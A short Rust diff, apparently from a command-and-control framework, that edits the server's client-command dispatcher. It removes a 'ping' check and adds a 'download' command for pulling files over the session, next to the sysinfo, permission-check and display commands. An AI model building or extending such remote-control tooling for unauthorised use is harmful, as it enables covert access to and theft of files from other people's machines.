@@ -6,9 +6,6 @@ pub mod server;
 
 pub fn dispatch_client(instruct:  Vec<&str>, conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {    
     match instruct.first() {
-        // Check conn
-        Some(&"ping") => client::ping::run(conn),
-
         // Local commands
         Some(&"lcd") => server::local::local_cd(&instruct),
         Some(&"lls") => server::local::local_list(),
@@ -19,6 +16,9 @@ pub fn dispatch_client(instruct:  Vec<&str>, conn: &mut TcpStream, state: &C2Sta
         Some(&"sysinfo") => client::system::sysinfo(conn),
         Some(&"check") => client::system::check_permissions(conn),
         Some(&"display") => client::system::display(&instruct, conn),
+
+        // File system
+        Some(&"download") => client::filesystem::download(&instruct, conn),
 
         // Close
         Some(&"close") => client::control::close_session(conn, state, true),
